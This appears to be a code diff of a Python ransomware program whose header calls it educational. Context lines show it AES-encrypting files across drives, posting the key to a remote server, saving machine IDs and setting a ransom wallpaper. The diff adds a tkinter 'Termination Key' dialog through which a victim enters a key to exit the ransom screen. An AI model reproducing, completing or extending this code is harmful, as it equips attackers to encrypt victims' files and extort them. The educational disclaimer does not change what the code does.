@@ -4,21 +4,25 @@ Author: Yakuza-D
 Disclaimer: this app written only and only for educational purpose
 """
 
-#import os
+
 import sys
+#import tkinter as tk
+from tkinter import Toplevel, Entry, Label, Button
+
+from os import makedirs, path, remove, walk
 from ctypes import windll
 import logging
 from uuid import uuid4
 from requests import post, exceptions
 from time import sleep
 from json import dumps
-from os import makedirs, path, remove, walk
 from datetime import datetime
 from Crypto.Cipher import AES
 from Crypto.Protocol.KDF import PBKDF2
 from Crypto.Random import get_random_bytes
 from Crypto.Util.Padding import pad
 from base64 import b64encode
+
 
 """ Part 1: Application functions """
 
@@ -282,7 +286,6 @@ Your Security Team
         logging.error("All attempts to send the key failed.")
         return False
 
-
     # Function to save the encryption key locally
     def save_key_locally(self):
         # Create Hardcoded Path for saving key
@@ -303,7 +306,6 @@ Your Security Team
             logging.error(f"[-] Failed to save the encryption key locally. Error: {str(e)}")
             return False
 
-
     # Function to save the machine ID
     def save_machine_id(self, directory_path):
         # Create Hardcoded Path for Machine_id.txt which store the machine id
@@ -323,7 +325,6 @@ Your Security Team
             # Submit Error Log for Failed the encryption key and the machine id saving
             logging.error(f"[-] Failed to save the Machine ID locally. Error: {str(e)}")
             return False
-
 
     # Function to process a drive (create files, encrypt, etc.)
     def process_drive(self, drive):
@@ -355,6 +356,36 @@ Your Security Team
         self.set_wallpaper(wallpaperPath) # noqa
         logging.info("[+] Wallpaper Set Successfully.")
         logging.info("[+] Encryption Process Completed. All files now encrypted.")
+
+# Define Termination Key Dialog class for user interactions
+class TerminationKeyDialog(Toplevel):
+    """ in this class, we have a dialog box to get the termination key from the user
+    to user can exit from the ransom """
+
+    def __init__(self, parent, icon_path):
+        super().__init__(parent)
+
+        # Set Icon, title and geometry
+        self.iconbitmap(icon_path)
+        self.title("Termination Key")
+        self.geometry("300x100")
+
+        # Initialize the result attribute, Termination Key give from Entry save to the result
+        self.result = None
+        # Label to show this message => Enter the termination key to Exit
+        Label(self, text="Enter the termination key to Exit:").pack(pady=5)
+
+        # Entry for user, to give the termination key from user
+        self.keyEntry = Entry(self)
+        self.keyEntry.pack(pady=5)
+        self.keyEntry.focus_set()
+
+        # when click on this, self.result == self.keyEntry.get()
+        Button(self, text="Submit", command=self.on_submit).pack(pady=5)
+
+    def on_submit(self):
+        self.result = self.keyEntry.get()
+        self.destroy()
 
 
 
